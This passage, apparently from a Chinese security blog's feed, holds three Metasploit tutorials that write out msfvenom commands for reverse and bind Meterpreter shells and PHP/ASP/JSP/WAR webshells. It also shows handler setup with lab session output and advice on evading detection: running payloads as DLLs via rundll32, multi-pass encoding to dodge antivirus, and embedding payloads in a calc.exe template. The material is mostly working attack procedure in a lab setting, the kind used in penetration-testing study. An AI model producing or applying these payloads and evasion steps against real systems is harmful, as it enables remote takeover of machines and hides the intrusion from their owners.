        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=625568&auto=1&height=66"></iframe><blockquote><p>生活不止眼前的苟且，还有诗和远方。Metasploit不只是反向，还有正向！</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/409.png" alt="图片"></p><blockquote><p>所谓正向，就是你拿着刀去砍肉；而反向就是你拿着刀，肉自己贴上来动</p></blockquote><ul><li>使用场景</li></ul><p>场景还是得具体看，⽐如⽬标机器不给其他除特定端⼝外的端⼝出站，那就只能能正向；还有⽐如有⼀种情<br>况，⽬标处于深层⽹络，不能直接连通外⽹，也不能通过其他机器连通，因为其他机器防⽕墙都开着，为避免<br>在有防⽕墙监控的情况下关闭防⽕墙⽽被发现，也只能⽤正向的马，然后通过开着防⽕墙的机器来进⾏端⼝的<br>转发达到穿透的⽬的</p><h2 id="msfvenom生成正向Paylaod"><a href="#msfvenom生成正向Paylaod" class="headerlink" title="msfvenom生成正向Paylaod"></a>msfvenom生成正向Paylaod</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f exe &gt;/root/bind_xx.exe </span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f exe &gt;/root/bind_xx.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f dll &gt;/root/bind_xx.dll </span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f dll &gt;/root/bind_xx.dll</span><br><span class="line"></span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f elf &gt;/root/bind_xx.elf</span><br><span class="line"></span><br><span class="line">msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f elf &gt;/root/bind_xx.elf</span><br></pre></td></tr></table></figure><p>因为我<code>win7</code>虚拟机是<code>x64</code>位系统，我就用这条命令：</p><blockquote><p>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=9090 -f exe &gt;/root/bind_xx.exe</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/410.png" alt="图片"></p><ul><li>LPORT</li></ul><blockquote><p>LPORT填写的是目标机器上没有占有的端口就行 ,我这边填写的是9090</p></blockquote><p>在肉鸡上运行：<code>bind_xx.exe</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/411.png" alt="图片"></p><p>可以看到，已经开放了<code>9090</code>端口！</p><p>接下来打开<code>msfconsole</code>对<code>肉鸡</code>进行连接(前提是对方防火墙是关闭了的)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/bind_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line">   RHOST                      no        The target address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/412.png" alt="图片"></p><p>其中<code>LPORT</code>需要设置为刚刚我们生成的<code>Payload</code>一样的端口，也就是<code>9090</code>:</p><p>还要设置一个<code>RHOST</code>，也就是肉鸡<code>Win7</code>的<code>IP</code>:<code>192.168.119.139</code></p><p>设置完后就是这样的：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/413.png" alt="图片"></p><p>最后直接运行<code>exoloit</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/414.png" alt="图片"></p><p>这个时候就反弹回来了一个<code>Meterpreter</code>会话回来！</p><p>同时，肉鸡<code>win7</code>那边就没有对<code>9090</code>端口进行连接了！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/415.png" alt="图片"></p><p>因为用了<code>9090</code>端口启用监听后，只会接收一次数据，无论成功或者失败，它都不会再监听了！</p><p>也就是说，如果连接失败了，那么就再运行然后再连接一次！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/416.png" alt="图片"></p><p>这是<code>Metasploit</code>生成正向的过程！</p><h2 id="尽量不要生成exe"><a href="#尽量不要生成exe" class="headerlink" title="尽量不要生成exe"></a>尽量不要生成exe</h2><p>在真实环境中，如果使用<code>msfvenom</code>生成了一个正向<code>Paylaod</code>格式是<code>exe</code>，那么在进程中就会暴露！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/417.png" alt="图片"></p><p>一般用就用<code>dll</code>！</p><p>要运行<code>dll</code>必须使用<code>rundll32.exe</code>来<code>start</code>:</p><p><code>rundll32.exe</code>文件在<code>C:\Windows\System32\rundll32.exe</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/418.png" alt="图片"></p><p>使用方法就是：</p><blockquote><p>rundll32.exe xxx.dll,Start</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/420.png" alt="图片"></p><p>可以看到，运行了之后，在进程中就没有可疑的<code>exe</code>文件了！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/421.png" alt="图片"></p><p>而<code>Meterpreter</code>这边也是反弹了一个shell回来</p><p>这就是 Metasploit 生成<code>正向</code> Payload 笔记!</p>]]></content>
      
      
      <categories>
          
          <category> 武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit之各种Payload生成与实战作用详解（反向）</title>
      <link href="/2019/10/09/metasploit-4/"/>
      <url>/2019/10/09/metasploit-4/</url>
      
        <content type="html"><![CDATA[<h2 id="Metasploit之各种Payload生成与实战作用详解（反向）"><a href="#Metasploit之各种Payload生成与实战作用详解（反向）" class="headerlink" title="Metasploit之各种Payload生成与实战作用详解（反向）"></a>Metasploit之各种Payload生成与实战作用详解（反向）</h2><blockquote><p>Metasploit生成的Payload分为正向和反向，这篇文章讲的是反向，如下图</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/402.png" alt="图片"></p><p>反向就是说<code>目标</code>执行了我们生成的<code>Payload</code>后，会主动连接我们的攻击服务器MSF</p><h2 id="生成二进制文件"><a href="#生成二进制文件" class="headerlink" title="生成二进制文件"></a>生成二进制文件</h2><ul><li><p>Windows</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure></li><li><p>Linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></li><li><p>Mac</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure></li></ul><h2 id="生成Webshell脚本"><a href="#生成Webshell脚本" class="headerlink" title="生成Webshell脚本"></a>生成Webshell脚本</h2><p>在做web渗透的时候，经常会⽤到<code>webshell</code>，我们经常⽤的⼀句话⽤菜⼑连接，如何使⽤<code>MSFVenom</code>⽣成⼀个可以<br>⽤msf操作的webshell呢？</p><ul><li>PHP</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port</span><br><span class="line">to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt;</span><br><span class="line">shell.php</span><br></pre></td></tr></table></figure><ul><li>ASP</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your</span><br><span class="line">Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><ul><li>JSP</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to</span><br><span class="line">Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure><ul><li>WAR</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to</span><br><span class="line">Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure><h2 id="如何生成Payload"><a href="#如何生成Payload" class="headerlink" title="如何生成Payload"></a>如何生成Payload</h2><p>用到的命令是<code>msfvenom</code>,具体可以看这篇文章：<a href="http://www.liuwx.cn/metasploit-5.html">msfvenom-命令介绍</a></p><ul><li>LHOST </li></ul><blockquote><p>填写的是攻击机器，也就是Kali的IP</p></blockquote><ul><li>LPORT</li></ul><blockquote><p>填写的是端口，一般填写的是高端口，如：6666、4444、8977等等，但是最好填写一下比较常用的端口，如：80、443、8080等等</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.136 LPORT=8080 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p>生成shell.exe：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@liuwx:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.136 LPORT=8080 -f exe &gt; shell.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 341 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时在当前目录下有一个<code>shell.exe</code>!</p><p>因为在文章开头说了，这是反向连接，那么就需要先在攻击机器上监听，然后再然后肉鸡运行我们的文件才可以连接！</p><h2 id="msfconsole接收"><a href="#msfconsole接收" class="headerlink" title="msfconsole接收"></a>msfconsole接收</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/404.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp //这个就是和上面msfvenom使用的payload是一样的</span><br><span class="line">set LHOST 192.168.119.136</span><br><span class="line">set LPORT 8080</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>接着我们放到<code>Windows7</code>下去执行这个二进制文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/403.png" alt="图片"></p><p>最后，来看看<code>Metasploit</code>这边的监听情况：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/405.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.119.136:8080 </span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.119.139</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.119.136:8080 -&gt; 192.168.119.139:49213) at 2019-10-09 21:42:14 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，<code>Windows7</code>运行了刚刚<code>msfvenom</code>生成的<code>shell.exe</code>后，<code>Metasploit</code>这边反弹了一个<code>meterpreter</code>会话过来！</p><blockquote><p>screenshot //截图当前桌面</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot</span><br><span class="line">Screenshot saved to: /root/BwCxBWYB.jpeg</span><br></pre></td></tr></table></figure><p>可以看到，使用<code>screenshot</code>后会在<code>/root/</code>下生成一个<code>BwCxBWYB.jpeg</code>的图片</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/406.png" alt="图片"></p><p>这个就是这么一个<code>Windows</code>的<code>反向</code>cmdshell</p><p>因为刚刚我们所反弹回来了一个shell，假设我们要重新监听其他的<code>payload</code>，那么就可以使用<code>background</code>来返回<code>msfconsole</code>控制台窗口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf5 exploit(multi/handler) &gt; </span><br></pre></td></tr></table></figure><p>如果想查看当前连接的肉鸡，就可以使用<code>sessions</code>查看在后台有哪些连接了<code>MSF</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/407.png" alt="图片"></p><p>如果想进入刚才那个<code>meterperter</code>，那么就<code>sessions</code>后面跟他的一个<code>id</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/408.png" alt="图片"></p><p>这样就进入了刚刚那个<code>cmdshell</code>里！</p>]]></content>
      
      
      <categories>
          
          <category> 武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit：如何使用 - msfvenom</title>
      <link href="/2019/10/09/metasploit-5/"/>
      <url>/2019/10/09/metasploit-5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Msfvenom 在 2015 年 6 月 8 日已经替代了 msfpayload 与 msfenocde 命令，它是这两个命令的结合体</p></blockquote><p>为了开始使用 <code>msfvenom</code>，可以首先浏览一下它所支持的命令参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Options:</span><br><span class="line">    -p, --payload       &lt;payload&gt;    Payload to use. Specify a <span class="string">&#x27;-&#x27;</span> or stdin to use custom payloads </span><br><span class="line">    <span class="comment"># 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取</span></span><br><span class="line">        --payload-options            List the payload<span class="string">&#x27;s standard options </span></span><br><span class="line"><span class="string">    # 列出指定 Payload 的标准可选配置项</span></span><br><span class="line"><span class="string">    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all </span></span><br><span class="line"><span class="string">    # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all</span></span><br><span class="line"><span class="string">    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload </span></span><br><span class="line"><span class="string">    # 指定 nop 在 payload 中的数量（译者注：类似堆喷射中通过 nop 滑动到 payload）</span></span><br><span class="line"><span class="string">    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list) </span></span><br><span class="line"><span class="string">    # 指定 Payload 的输出格式</span></span><br><span class="line"><span class="string">        --help-formats               List available formats </span></span><br><span class="line"><span class="string">    # 列出所有可用的输出格式</span></span><br><span class="line"><span class="string">    -e, --encoder       &lt;encoder&gt;    The encoder to use </span></span><br><span class="line"><span class="string">    # 指定使用的 Encoder</span></span><br><span class="line"><span class="string">    -a, --arch          &lt;arch&gt;       The architecture to use </span></span><br><span class="line"><span class="string">    # 指定目标系统架构</span></span><br><span class="line"><span class="string">        --platform      &lt;platform&gt;   The platform of the payload </span></span><br><span class="line"><span class="string">    # 指定目标系统平台</span></span><br><span class="line"><span class="string">        --help-platforms             List available platforms </span></span><br><span class="line"><span class="string">    # 列出可用的平台</span></span><br><span class="line"><span class="string">    -s, --space         &lt;length&gt;     The maximum size of the resulting payload </span></span><br><span class="line"><span class="string">    # 设置未经编码的 Payload 的最大长度</span></span><br><span class="line"><span class="string">        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value) </span></span><br><span class="line"><span class="string">    # 编码后的 Payload 的最大长度</span></span><br><span class="line"><span class="string">    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: &#x27;</span>\x00\xff<span class="string">&#x27; </span></span><br><span class="line"><span class="string">    # 设置需要在 Payload 中避免出现的字符</span></span><br><span class="line"><span class="string">    -i, --iterations    &lt;count&gt;      The number of times to encode the payload </span></span><br><span class="line"><span class="string">    # 设置 Payload 的编码次数</span></span><br><span class="line"><span class="string">    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include </span></span><br><span class="line"><span class="string">    # 指定包含一个额外的win32 shellcode文件</span></span><br><span class="line"><span class="string">    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template </span></span><br><span class="line"><span class="string">    # 指定一个特定的可执行文件作为模板</span></span><br><span class="line"><span class="string">    -k, --keep                       Preserve the template behavior and inject the payload as a new thread </span></span><br><span class="line"><span class="string">    # 保护模板程序的功能，注入的payload作为一个新的进程运行</span></span><br><span class="line"><span class="string">    -o, --out           &lt;path&gt;       Save the payload </span></span><br><span class="line"><span class="string">    # 保存 Payload 到文件</span></span><br><span class="line"><span class="string">    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats </span></span><br><span class="line"><span class="string">    # 指定一个变量名</span></span><br><span class="line"><span class="string">    #（译者注：当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码</span></span><br><span class="line"><span class="string">    # 追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）</span></span><br><span class="line"><span class="string">        --smallest                   Generate the smallest possible payload </span></span><br><span class="line"><span class="string">    # 尽可能生成最短的 Payload</span></span><br><span class="line"><span class="string">    -h, --help                       Show this message </span></span><br><span class="line"><span class="string">    # 帮助</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h2 id="如何生成Payload"><a href="#如何生成Payload" class="headerlink" title="如何生成Payload"></a>如何生成Payload</h2><p>为了生成 Payload，你需要配置两个必要的参数（-p 与 -f）：</p><ul><li>-p 参数指定特定的 Payload</li></ul><p>可以通过如下命令列出所有可以使用的 Payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads</span><br></pre></td></tr></table></figure><ul><li>-p 参数也支持使用 - 作为值来从标准输入中读取自定义的 Payload</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload_file.bin | msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw</span><br></pre></td></tr></table></figure><ul><li>-f 参数指定 Payload 的输出格式</li></ul><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp -f exe</span><br></pre></td></tr></table></figure><p>可以通过如下命令来查看所有支持的格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --help-formats</span><br></pre></td></tr></table></figure><p>下面是一个典型的 msfvenom 的使用案例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker&#x27;s IP] lport=4444 -f exe -o /tmp/my_payload.exe</span><br></pre></td></tr></table></figure><h2 id="如何对-Payload-进行编码"><a href="#如何对-Payload-进行编码" class="headerlink" title="如何对 Payload 进行编码"></a>如何对 Payload 进行编码</h2><p>默认情况下，当你使用 <code>-b </code>选项（badchar 选项）时，编码功能将自动启动。 在其他情况下，您必须使用<code>-e</code>选项来开启 Payload 编码功能，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw</span><br></pre></td></tr></table></figure><p>如下所示，使用 <code>-l</code> 参数可以列出所有可用的编码器（译者注：encoder）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l encoders</span><br></pre></td></tr></table></figure><p>你也可以通过添加 <code>-i</code> 参数来将一个 <code>Payload</code> 编码<code>多次</code>，有时候多次编码可以绕过防病毒软件的检测（译者注：俗称免杀）。<br>但是要知道的是：编码并不能真正作为免杀的解决方案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 </span><br></pre></td></tr></table></figure><h2 id="避免使用某些字符（译者注：例如某些情况下-Payload-中是不可以出现-x00-字符的）"><a href="#避免使用某些字符（译者注：例如某些情况下-Payload-中是不可以出现-x00-字符的）" class="headerlink" title="避免使用某些字符（译者注：例如某些情况下 Payload 中是不可以出现 \x00 字符的）"></a>避免使用某些字符（译者注：例如某些情况下 Payload 中是不可以出现 \x00 字符的）</h2><p><code>-b</code> 参数被设置的时候，它的值中描述的字符将会被避免出现在 <code>Payload</code> 中<br>当这个参数被添加的时候，<code>msfvenom</code> 将会自动寻找合适的编码器来编码 Payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp -b &#x27;\x00&#x27; -f raw</span><br></pre></td></tr></table></figure><h2 id="如何提供一个自定义的模板"><a href="#如何提供一个自定义的模板" class="headerlink" title="如何提供一个自定义的模板"></a>如何提供一个自定义的模板</h2><p>默认情况下，<code>msfvenom</code> 使用保存在目录 <code>msf/data/templates</code> 下的模板文件。如果你想要选择自己的模板，你可以使用 <code>-x</code> 参数来指定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe </span><br></pre></td></tr></table></figure><p>请注意：如果你想使用一个自定义的基于 <code>64</code> 位操作系统的模板，那么请将 <code>-f</code> 参数中的 <code>exe</code> 修改为 <code>exe-only</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only &gt; /tmp/fake_64_calc.exe</span><br></pre></td></tr></table></figure><p><code>-x</code> 参数经常与 <code>-k</code> 参数成对出现，这样你就可以将模板中的 <code>Payload</code> 作为新线程运行。</p><p>但是，目前这仅适用于较老的<code>Windows</code>机器，如 <code>x86 Windows XP</code>。</p><h2 id="如何将-msfvenom-的输出串联起来（利用操作系统管道的重定向特性）"><a href="#如何将-msfvenom-的输出串联起来（利用操作系统管道的重定向特性）" class="headerlink" title="如何将 msfvenom 的输出串联起来（利用操作系统管道的重定向特性）"></a>如何将 msfvenom 的输出串联起来（利用操作系统管道的重定向特性）</h2><p>以前旧的 <code>msfpayload</code> 与 <code>msfencode</code> 经常串联使用，并按照多种编码顺序排列。<code>msfvenom</code> 也可以被这样使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \</span><br><span class="line">msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \</span><br><span class="line">msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit-auxiliary的常用模块使用</title>
      <link href="/2019/10/09/metasploit-3/"/>
      <url>/2019/10/09/metasploit-3/</url>
      
